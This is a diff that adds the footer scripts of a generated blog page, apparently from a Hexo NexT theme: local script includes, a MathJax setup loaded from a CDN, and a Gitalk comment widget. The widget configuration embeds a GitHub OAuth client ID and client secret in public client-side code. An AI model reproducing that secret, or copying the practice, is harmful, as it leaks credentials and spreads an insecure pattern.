+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '7c58e80079a2457b610d',
+      clientSecret: 'fc16b1b0fdfb278016ebe41c20f3743c3c927466',
+      repo        : 'comments.github.io',
+      owner       : 'v5le0n9',
+      admin       : ['v5le0n9'],
+      id          : '6703fa3693374a372bda88b41f8e6879',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
